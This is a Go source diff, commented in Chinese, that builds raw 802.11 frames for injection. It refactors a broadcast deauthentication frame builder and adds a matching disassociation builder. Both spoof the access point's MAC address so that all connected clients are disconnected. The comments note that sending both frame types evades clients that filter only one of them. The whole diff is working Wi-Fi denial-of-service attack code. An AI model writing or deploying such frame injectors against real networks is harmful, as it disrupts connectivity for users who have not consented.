@@ -74,7 +74,21 @@ const (
 // 广播地址（addr1=ff:ff:ff:ff:ff:ff）让 AP 下所有关联客户端同时失效；
 // WPA3/6GHz 网络因 PMF 强制启用会丢弃该帧，属协议层面的固有约束。
 func BuildDeauthFrame(bssid net.HardwareAddr) ([]byte, error) {
-	// 地址必须是 6 字节，额外校验防止 net.ParseMAC 以外的非法输入。
+	return buildManagementFrame(bssid, subtypeDeauth)
+}
+
+// BuildDisassocFrame 构造广播 802.11 disassociation 管理帧。
+// 与 deauth 帧结构完全相同（34B），仅 Frame Control 子类型不同：
+// disassoc(10) 替代 deauth(12)。客户端对两者的帧过滤路径不同，
+// 同时发两种帧可覆盖只过滤 deauth 但不过滤 disassoc 的实现。
+func BuildDisassocFrame(bssid net.HardwareAddr) ([]byte, error) {
+	return buildManagementFrame(bssid, subtypeDisassoc)
+}
+
+// buildManagementFrame 是 deauth/disassoc 的公共构造器。
+// 两种帧结构一致：radiotap(8B) + MAC 头(24B) + reason(2B) = 34B，
+// 唯一差异是 Frame Control 低字节的子类型字段（bit 4-7）。
+func buildManagementFrame(bssid net.HardwareAddr, subtype int) ([]byte, error) {
 	if len(bssid) != 6 {
 		return nil, errors.New("BSSID 长度错误，必须为 6 字节 MAC 地址")
 	}
@@ -82,24 +96,21 @@ func BuildDeauthFrame(bssid net.HardwareAddr) ([]byte, error) {
 	frame := make([]byte, DeauthFrameLen)
 
 	// Radiotap 最小头：仅声明自身长度为 8，不携带任何字段。
-	// 对大多数注入驱动而言，这已足以让芯片按当前信道/速率发送。
-	frame[0] = 0x00 // version
-	frame[1] = 0x00 // pad
+	frame[0] = 0x00
+	frame[1] = 0x00
 	frame[2] = radiotapHeaderLen
-	frame[3] = 0x00 // length 高字节（小端）
-	// frame[4..7] it_present 位图全 0，表示不携带任何扩展字段
+	frame[3] = 0x00
 
-	// Frame Control：version(0) | type(management) | subtype(deauth)。
-	// 低字节 bit 4-7 放子类型 12（0xC），bit 2-3 放类型 0，故为 0xC0；
-	// 高字节为 Flags（toDS/fromDS/protected/order 等），deauth 全清 0。
-	frame[8] = byte(subtypeDeauth<<4 | frameTypeManagement<<2)
+	// Frame Control：version(0) | type(management) | subtype。
+	// 低字节 bit 4-7 放子类型，bit 2-3 放类型 0（管理帧）。
+	frame[8] = byte(subtype<<4 | frameTypeManagement<<2)
 	frame[9] = 0x00
 
 	// Duration：注入场景下无 NAV 预留需求，置 0。
 	frame[10] = 0x00
 	frame[11] = 0x00
 
-	// addr1（Receiver/Destination）：广播地址，AP 下所有关联客户端均处理。
+	// addr1（Receiver/Destination）：广播地址。
 	for i := 0; i < 6; i++ {
 		frame[12+i] = 0xff
 	}
@@ -107,7 +118,7 @@ func BuildDeauthFrame(bssid net.HardwareAddr) ([]byte, error) {
 	// addr2（Transmitter/Source）= BSSID：伪装成 AP 自己发出。
 	copy(frame[18:24], bssid)
 
-	// addr3（BSS Identifier）= BSSID：标识该帧所属的 BSS。
+	// addr3（BSS Identifier）= BSSID。
 	copy(frame[24:30], bssid)
 
 	// Sequence Control：置 0 占位，网卡芯片发送时按自身序列计数器填充。
